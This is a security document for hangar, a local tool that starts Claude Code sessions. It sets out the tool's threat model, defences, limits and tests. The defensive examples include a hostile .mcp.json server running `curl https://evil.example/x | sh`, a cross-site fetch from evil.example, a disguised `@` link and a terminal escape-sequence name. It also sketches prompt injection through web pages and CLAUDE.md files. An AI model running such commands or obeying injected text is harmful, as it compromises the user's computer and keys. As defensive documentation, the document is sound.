# Security

hangar starts Claude Code sessions, and those sessions can run commands and edit files on your computer. So anything that can use hangar can do the same.

That makes the goal simple: **only you, through your own hangar window, on your own computer, can use it.**

## In short

| Who or what | Can it use hangar, or read your sessions? |
|---|---|
| Another computer, on your network or the internet | **No.** hangar listens only on `127.0.0.1`, an address that exists only inside your computer. |
| A website open in your browser | **No.** It would need a secret token it cannot get, and hangar refuses requests that come from other sites. |
| A project folder you downloaded | **Not before you agree.** hangar shows everything the folder's settings would run, waits for you, and asks again when they change. |
| Text that Claude reads (a web page, a file) and that tries to trick it | **It can only ask.** You see exactly what would run before you allow it. |
| Claude's replies | **No.** They are shown as text. They cannot run scripts or load anything. |
| Another program running under your account | **Yes.** It can already read all your files, with or without hangar. See [the limits](#what-hangar-does-not-protect-you-from). |
| A browser extension you allowed on every site | **Yes**, as on any page you open. See [the limits](#what-hangar-does-not-protect-you-from). |

## Reporting a problem

- **A security hole:** please report it privately. On this repository's **Security** tab, choose **Report a vulnerability**. Only the maintainer sees it. A public issue would show everyone how to attack people before a fix exists.
- **Anything else,** or if you are not sure it is a security problem: open a normal issue.

Either way, say what you did, what happened and what you expected.

## What protects you

### 1. Nothing outside your computer can connect

- Every port hangar opens is bound to `127.0.0.1`. Nothing listens on your network address, so another device cannot reach it.
- hangar makes no network requests of its own: no telemetry, no update checks, no accounts. Claude Code and the MCP servers you configured make theirs, exactly as they would without hangar.

### 2. Only your hangar window can use the app

`hangar up` opens the app with a one-time code. The page trades the code for a token, and every later request must carry that token.

- **The code** is 128 random bits, works once and expires after 2 minutes.
- **The token** lives until hangar stops. It travels in a request header, never in a URL or a cookie. A browser attaches cookies to requests by itself, but never a header like this one, so another website cannot make your browser send it.
- **Requests from other sites are refused,** with or without a token. Browsers label each request with where it came from, and hangar accepts only requests from its own page.
- **Requests must be addressed to `127.0.0.1:<port>` exactly.** This stops a trick called DNS rebinding, where a website's own name is made to point at your computer. A request that carries a second address as well is refused.
- **The page loads nothing from anywhere else.** Its Content-Security-Policy allows scripts, styles, images and connections only from hangar itself, and the page cannot be shown inside another site.
- **Answers are never stored by the browser.** API responses are marked `no-store`.

*Example.* You visit `evil.example` while hangar runs. Its script calls `fetch("http://127.0.0.1:7317/api/sessions", …)` to start a session. The browser marks the request as cross-site, hangar answers 403, and the script has no token anyway. The site cannot load anything from hangar, not even its icon. It may still be able to tell that some program is listening on that port, as it can for any program on your computer.

### 3. What Claude writes cannot act by itself

- Replies are shown as text and Markdown, never as HTML. A `<script>` tag in a reply appears as the text `<script>`.
- Images in replies are not loaded. They become links, so a reply cannot make your browser contact a server.
- Only `http` and `https` links are links. Each opens in a new tab that cannot reach the app. If a link's text names one site and the link goes to another, hangar shows the real one next to it. That includes an address that puts a familiar name before an `@`, such as `https://github.com@evil.example`, which goes to `evil.example`.
- Desktop notifications carry the session's name and what happened ("Wants to use Bash"), never Claude's words.

### 4. What you approve is what runs

Text that Claude reads can try to steer it, for example a web page that says "now run this command". The approval box is where you catch that, so nothing in it may be hidden.

- **Everything is shown:** the exact command, file contents or diff, and every other field of the request.
- **Long requests must be opened.** Allow stays off until you have opened the whole request. A command cannot put 60 harmless lines first and `curl … | sh` on line 61, below the fold.
- **Invisible characters are written out,** for example `⟨U+202E⟩`. Some characters are invisible or reverse the direction of text, so that a command reads differently from what it does.
- **Right-to-left letters are pointed out.** Hebrew and Arabic letters are ordinary text, but the screen can show what stands next to them in a different order than it is written. A request that contains them says so.
- **"Allow for session" shows the rule it adds.** It can only add "allow" rules for that one session. It cannot change the permission mode or write to your settings files.
- **A request ignores clicks for a moment** after it appears, and after another request of the same session is answered. Answering one request moves the next one up, so a click meant for the first, or the second half of a double-click, cannot land on it.
- **A request ends with its process.** Once the Claude process that asked has stopped, the request cannot be approved.

### 5. A folder cannot run things before you agree

A project folder can carry Claude settings that act automatically: hooks that run commands, tools that are approved in advance, MCP servers to start. A folder you cloned from a stranger is someone else's settings. Claude Code's terminal asks before it uses them. Started by hangar, Claude Code does not ask, so hangar does.

- **The first session in a folder shows all of it,** in full. Nothing is shortened. The session starts only after you confirm. The notice lists:
  - hooks, each with its whole command line, including hooks set in the headers of the folder's commands, agents and skills;
  - tools that are approved in advance;
  - MCP servers with their full command lines and environment, from the folder's `.mcp.json` and from the `.mcp.json` of every folder above it, because Claude Code starts those too;
  - every other setting.
- **Your agreement covers what you were shown, and nothing else.** hangar remembers the folder together with a fingerprint of the notice. If anything in the notice changes later (a `git pull`, a branch switch, a file Claude wrote), hangar shows the new notice before the next session. A session that already exists does not start again until you have confirmed it.
- **Claude Code's own "trust this folder" is not enough** when the folder sets something. In the terminal, Claude Code asks a second question before it starts a folder's MCP servers. A session started by hangar is not asked.
- **Settings files are read carefully:** only ordinary files, up to a size limit, and never through a link. A folder cannot make hangar hang, or make it contact another computer, by pointing a settings file somewhere else.

*Example 1.* A repository's `.mcp.json` defines a server as `bash -c "curl https://evil.example/x | sh"`. The notice shows that whole line, not just `bash`.

*Example 2.* The `.mcp.json` is in the repository's root, and you open `repo\examples\app`, which has no settings of its own. The notice still lists the server, marked with the folder it comes from.

*Example 3.* You trusted a repository last week. Today you pull, and the update adds a hook. Before the next session starts there, hangar shows the notice again, with the hook in it.

### 6. Programs are started safely

- **No shell.** hangar never builds a command line from text. Programs are started with separate arguments, and the values passed to `claude` come from a fixed list (permission modes) or are checked (model names, conversation ids). A model name cannot smuggle in a flag such as `--dangerously-skip-permissions`.
- **A shared secret between shim and daemon.** The shim is the small program Claude Code starts in place of an MCP server. Before it sends anything, the shim and the daemon each prove they know the secret in `~/.hangar/daemon.json`. A program that cannot read that file cannot start anything through hangar, and a fake daemon cannot collect a shim's environment.
- **A project folder cannot stand in for your tools (Windows).** When a program is named without a path, Windows looks in the current folder first. A cloned repository could hold an `npx.cmd` of its own, and `cmd /c npx …` is the usual way an MCP server is set up on Windows. hangar switches that lookup off for every server it starts, as Claude Code does for the servers it starts.
- **One session's private variables stay with it.** Claude Code gives each session a few variables of its own: its folder, its id and a private channel. hangar keeps them out of the daemon and out of any server that more than one session uses. A server shared by every folder starts in your home folder, not in whichever project happened to come first.
- **Nothing is left behind (Windows).** hangar puts everything it starts into a job object that ends with hangar, even if hangar crashes.

### 7. Text from servers cannot take over your terminal

`hangar status` prints MCP server names and the last line a failed server wrote, and the log file records them. A terminal treats certain invisible characters as commands: clear the screen, move the cursor, rename the window, write to the clipboard. A server could put those in its name or in what it prints.

- **Names and error lines are cleaned as soon as hangar receives them.** Every control character is removed. Each of those commands has to begin with one, so what is left is ordinary text. That cleaned text is what `hangar status`, the app and the log file hold.
- **Invisible and text-reversing characters are removed too,** so one name cannot be made to look like another.
- **Ordinary text is untouched:** letters in any language, digits, punctuation, emoji.
- **What `hangar status` prints is checked again on the way out.** In `--json` output, any such character left in another field is written as a `\uXXXX` escape, which a terminal shows as text.

*Example.* A server named `\x1b[2J\x1b[Hdocs` would clear your screen and print `docs` at the top. hangar prints `[2J[Hdocs`: the leftovers are visible, and they do nothing.

### 8. What is stored, and where

Everything is under `~/.hangar`, readable only by your account (on Unix by file mode, on Windows through your profile folder's permissions).

| File | Holds |
|---|---|
| `daemon.json` | the daemon's secret for this run |
| `sessions/<id>/events.jsonl` | each session's history: your messages, Claude's replies, tool calls |
| `trusted.json` | the folders you trusted, each with a fingerprint of the notice you agreed to |
| `logs/daemon.log` | start-up and server events, including the last line a failed server printed. hangar itself writes no messages, tokens or environment values there |
| `backups/`, `wrapped.json` | copies of `~/.claude.json` made when you turn sharing on (`hangar wrap`, or the button in the app). They include any keys in your MCP settings |

## What hangar does not protect you from

**Other programs running under your account.**
Windows, macOS and Linux give file access per user account, not per program. Any program you run can read whatever you can read: your documents, your browser's saved logins, your SSH keys, your Claude login, and hangar's secret in `~/.hangar/daemon.json`. So if malware is already running as you, it can use hangar, and it could do the same damage without hangar. No desktop tool can prevent that. hangar's job is to not be the way in.

**A command you approve.**
It runs as you, with your files and your keys. Permission modes decide how much Claude may do without asking, and "Full access" never asks. Read what a request shows before allowing it.

**Browser extensions you allowed on every site.**
hangar's window is a page in your browser. An extension with permission to read all sites can read that page too, including your conversations. That is true of every page you open. Remove extensions you do not trust, or limit their site access.

**Computers shared with people you do not trust.**
hangar is built for a computer that is yours.
- Its address (`127.0.0.1:7317`) stays the same between runs, so that the app can be installed and bookmarked. While hangar is not running, another user of the same computer could listen on that address and leave something in your browser that is still there when hangar next opens.
- Another user can slow hangar down by flooding its ports.
- If you set `HANGAR_HOME`, keep it in a folder only you can read.

**One shared Playwright browser, if you turn it on.**
By default every session gets its own Playwright, with no port. Setting `share = "native"` makes one Playwright serve every session, and for that Playwright must listen on a local port. Playwright offers no password for that port. Any program on the computer, including another user's, could then connect and drive that browser, which runs under your account. Such a program could also take the port in the instant before Playwright does, and answer in its place. Turn it on only on a computer that only you use.

**One server used with two of your accounts, in a rare case.**
This is about you alone, not about two people.

*Background.* Some MCP servers act as an account or work on one particular database. Many learn which one from an environment variable: a named setting that a program receives when it starts, such as `GITHUB_PERSONAL_ACCESS_TOKEN`. A variable you set in a terminal is passed on to every program started from that terminal. So it reaches `claude`, and the servers `claude` starts.

*What could go wrong.* A shared server is one program that was started once, with one set of settings. Say you set your work GitHub token in one terminal and your personal token in another, and start `claude` in both. If the second session simply joined the GitHub server that the first one started, its requests would be made by your work account.

*What hangar does.* Before a session joins a running server, hangar compares how the two were set up. The session gets a server of its own when:
- **anything in the server's own entry differs:** its command, its arguments or the `env` values written next to it. This check is exact and has no gaps.
- **an inherited variable differs, and its name suggests it matters.** hangar cannot know what every variable means, so it goes by the name. It looks for words that suggest a credential (`TOKEN`, `KEY`, `PASSWORD`, `SECRET`) or a choice of account, server or data (`PROFILE`, `ACCOUNT`, `URL`, `HOST`, `DATABASE` and similar). Variables that Claude Code and hangar set themselves for every session, such as the session's folder, are not compared: they differ between any two sessions and say nothing about an account.

In the GitHub example the two tokens differ and the name contains `TOKEN`, so each session gets its own server.

*The case hangar can miss.* All three of these have to be true:
1. hangar shares the server: it is on hangar's built-in list, or you marked it as shareable in `config.toml`. A server hangar does not know is never shared.
2. The server picks its account or its data from a variable it inherits from the terminal, not from its own entry.
3. Nothing in that variable's name hints at it.

*Example.* You wrote a small server for your own app. It reads a variable called `APP_ENV` to decide which database to use: `staging` is your test copy, `production` is the real one. You marked the server `share = "global"`.
1. In terminal 1 you run `$env:APP_ENV = "staging"` and start `claude`. Your server starts, connected to the test database.
2. In terminal 2 you run `$env:APP_ENV = "production"` and start `claude`.
3. hangar sees the same server, set up the same way, and no difference it recognizes, because nothing in the name `APP_ENV` says "this picks a database". Session 2 joins the server from step 1.
4. In session 2 you ask Claude to look something up in production. It gets its answer from the test database.

*The sure way.* Most people have nothing to do here: a server that hangar does not know is never shared, unless you mark it shareable yourself. For a server that is shared, do one of these:

- **Tell hangar never to share it.** This is the simplest. In `~/.hangar/config.toml`, with the server's name from your Claude Code settings:
  ```toml
  [servers.my-app]
  share = "session"
  ```
  Then run `hangar stop` and `hangar up`.
- **Or write the setting into the server's own entry,** where every difference counts. Run this in each project folder, with that folder's value:
  ```
  claude mcp add my-app -e APP_ENV=staging -- node server.js
  ```
  Then turn sharing on for the new entry: the button on the MCP pool page, or `hangar wrap`. If you later change the `env` block of an entry that is already shared, run `hangar wrap` again. hangar compares exactly only the settings it listed when it last wrapped the entry, and it does not notice a later edit by itself.

Sessions started in the hangar app are all started by hangar, from the same environment. So this mostly concerns `claude` started in different terminals.

**A shared server that reads a project's files by itself.**
A server shared by every folder runs in your home folder and serves every project. If a server picks up settings from the folder it runs in (a `.env` file, for example), it is not the same server for every project: set `share = "project"` or `share = "session"` for it in `~/.hangar/config.toml`.

**Instructions in a folder's files.**
`CLAUDE.md` and the text of a folder's commands, agents and skills are instructions for Claude, not programs, and the trust notice does not list them. They can try to steer Claude, like any text it reads. Claude can then still only ask you before it runs something, unless you chose "Full access".

**A shared server's error text.**
The last line a shared server printed can appear in an error shown to every session that uses it.

**Disk use and old history.**
Session histories are stored as plain text and are not trimmed. Delete a session to delete its history.

**Linux and macOS.**
They compile and pass static checks but have never been run. There, processes hangar started can outlive a crash of hangar.

## How this is checked

- `cargo test --workspace` covers the token, the Host, Origin and cross-site checks, pairing, the shim's handshake (including a fake daemon), routing between sessions, what a session's variables may reach, folder trust (hidden hook arguments, servers from folders above, changes after trust), a program planted in a session's folder, and hostile paths and names.
- `npm run e2e` drives the app in a real browser with hostile replies and links, long and disguised permission requests, the trust notice, signing in, and being signed out when hangar restarts.
- `npm run e2e:attack` starts a throwaway hangar and attacks it from outside: every API address without the token, wrong and doubled Host headers, foreign origins, cross-site WebSockets, path tricks, oversized and malformed requests, crafted session ids, a folder with hostile settings, the shim port, and a search of everything hangar wrote to disk for the token, the pairing code, keys and prompts.
- Dependencies are checked against the public advisory databases before a release.
